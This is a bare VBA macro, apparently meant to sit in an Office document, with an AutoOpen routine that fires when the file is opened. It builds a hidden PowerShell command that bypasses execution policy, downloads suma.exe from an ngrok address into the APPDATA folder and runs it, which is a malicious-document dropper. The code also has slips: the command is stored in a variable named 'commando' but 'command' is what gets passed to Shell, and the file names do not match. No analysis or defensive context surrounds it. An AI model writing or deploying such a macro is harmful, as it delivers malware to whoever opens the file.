Sub AutoOpen()
commando = "powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://be8c9f2742e2.ngrok.io/example/suma.exe',"$env:APPDATA\$ProcName");Start-Process ("$env:APPDATA\suma.exe")"
ret = Shell(command, 1)
End Sub